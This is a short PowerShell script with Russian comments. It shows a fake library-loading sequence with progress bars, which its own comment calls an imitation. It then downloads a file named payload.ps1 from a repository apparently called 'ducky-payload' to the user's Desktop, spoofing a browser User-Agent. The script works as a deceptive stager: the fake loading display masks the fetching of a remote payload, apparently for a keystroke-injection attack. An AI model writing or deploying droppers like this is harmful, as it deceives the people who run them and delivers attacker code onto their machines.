# 1. Красивая имитация загрузки библиотек
$libs = @(
    "System.Net.Http.dll",
    "System.Security.Cryptography.dll",
    "Newtonsoft.Json.dll",
    "Discord.Net.Core.dll"
)

Write-Host "Инициализация среды..." -ForegroundColor DarkGray
Start-Sleep -Milliseconds 800

foreach ($lib in $libs) {
    Write-Host "Загрузка библиотеки: $lib ..." -ForegroundColor Cyan -NoNewline
    # Имитация прогресс-бара
    for ($i = 0; $i -le 100; $i += 20) {
        Write-Host " [■■■■■□□□□□] $i%" -ForegroundColor Yellow -NoNewline
        Start-Sleep -Milliseconds 100
        Write-Host "`r" -NoNewline
    }
    Write-Host " [■■■■■■■■■■] 100% - OK" -ForegroundColor Green
    Start-Sleep -Milliseconds 300
}

Write-Host "`nВсе библиотеки загружены. Начинаю скачивание скрипта..." -ForegroundColor Magenta
Start-Sleep -Seconds 1

# 2. Сама загрузка скрипта (качаем .ps1 на Рабочий стол)
$url = "https://raw.githubusercontent.com/brotimofeenk-svg/ducky-payload/main/payload.ps1"
$dest = "$env:USERPROFILE\Desktop\downloaded_script.ps1"

try {
    # Добавляем User-Agent, чтобы GitHub не блокировал запрос
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $wc.DownloadFile($url, $dest)
    Write-Host "Скрипт успешно скачан: $dest" -ForegroundColor Green
} catch {
    Write-Host "Ошибка скачивания: $_" -ForegroundColor Red
}

Write-Host "`nГотово. Нажмите Enter для выхода..."
Read-Host
